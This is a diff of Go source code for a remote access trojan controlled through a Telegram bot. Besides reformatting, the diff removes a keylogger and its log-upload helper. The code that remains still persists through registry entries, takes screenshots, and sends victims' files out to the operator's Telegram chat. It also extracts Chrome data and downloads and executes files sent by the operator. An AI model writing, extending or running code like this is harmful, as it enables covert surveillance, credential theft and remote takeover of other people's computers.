@@ -1,13 +1,12 @@
 package main
 
 import (
-	"os"
-	"os/user"
+	"gopkg.in/telegram-bot-api.v4"
 	"path/filepath"
-	"runtime"
+	"os"
 	"strings"
-
-	tgbotapi "gopkg.in/telegram-bot-api.v4"
+	"os/user"
+	"runtime"
 )
 
 func initRat() {
@@ -15,7 +14,7 @@ func initRat() {
 	RegistryFromConsole(true, true, true)
 }
 
-func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
+func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) (string) {
 	var msg = ""
 	//msg += "Ur cmd was:("+strconv.FormatBool(command.IsCommand() || command.Text[:1] == "/")+")"
 	if command.IsCommand() {
@@ -42,8 +41,6 @@ func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
 			msg += "OK. Running..."
 		case "uninstall":
 			UnRegistryFromConsole(true)
-			sendMsg(bot, ADMIN_ID, "The RATATATA has been uninstalled!")
-			msg += "OK. Uninstalled."
 			os.Exit(0)
 		case "info":
 			hName, _ := os.Hostname()
@@ -62,27 +59,15 @@ func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
 			makeScreenshot("./sc.png")
 			go uploadFile(command.Chat.ID, "./sc.png", bot, true)
 		case "dl":
-			go uploadFile(command.Chat.ID, arrToStr(" ", strings.Split(command.Text, " ")[1:]), bot, false)
+			go uploadFile(command.Chat.ID, arrToStr(" ",strings.Split(command.Text, " ")[1:]), bot, false)
 			msg += "uploading... Please, stand by!"
 		case "chrome":
-			msg += getChrome()
-		case "keylogger":
-			var kl Keylogger
-			go func() {
-				for {
-					kl.GetKey()
-				}
-			}()
-			sendMsg(bot, ADMIN_ID, "Keylogger started!")
-		case "stopKeyRetrieveKey":
-			fileName := "keylog.txt"
-			go uploadFileToTelegram(bot, ADMIN_ID, fileName)
-			sendMsg(bot, ADMIN_ID, "done")
+			msg+=getChrome()
 		case "to":
 			currUser, _ := user.Current()
 			ipCfg, _ := GetExternalIP()
 			//log.Println("HNAME:",strings.Split(command.Text, " ")[1] == strings.Split(currUser.Username, "\\")[0])
-			if strings.Split(command.Text, " ")[1] == strings.Split(currUser.Username, "\\")[0] || strings.Split(command.Text, " ")[1] == ipCfg.Ip {
+			if strings.Split(command.Text, " ")[1] == strings.Split(currUser.Username, "\\")[0] || strings.Split(command.Text, " ")[1] == ipCfg.Ip{
 				command.Text = arrToStr(" ", strings.Split(command.Text, " ")[2:])
 				//log.Println("RECURSIVLY RUNNING COMMAND:",command.Text)
 				msg += parseCmd(command, bot)
@@ -93,7 +78,7 @@ func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
 	} else if command.Document != nil {
 		if command.Caption != "exec" {
 			msg += "saved to: " + dlFile(command.Document.FileID, command.Document.FileName, bot)
-		} else {
+		}else {
 			filePath := dlFile(command.Document.FileID, command.Document.FileName, bot)
 			msg += "saved to: " + filePath + "; EXECUTING..."
 			go runCmd("<nil> start "+filePath, command.Chat.ID, bot)
@@ -102,18 +87,4 @@ func parseCmd(command *tgbotapi.Message, bot *tgbotapi.BotAPI) string {
 		msg = HELP
 	}
 	return msg
-}
-
-// Function to send key presses to a telegram chat. Must be inserted in a for looping printing all the keys.
-// Need to implement threading to increase performance
-
-//func sendKeyPressMessage(bot *tgbotapi.BotAPI, chatID int64, key rune) {
-//	msg := fmt.Sprintf("Key pressed: %c", key)
-//	bot.Send(tgbotapi.NewMessage(chatID, msg))
-//}
-
-func uploadFileToTelegram(bot *tgbotapi.BotAPI, chatID int64, fileName string) {
-	filePath := filepath.Join(os.TempDir(), fileName)
-	msg := tgbotapi.NewDocumentUpload(chatID, filePath)
-	bot.Send(msg)
 }
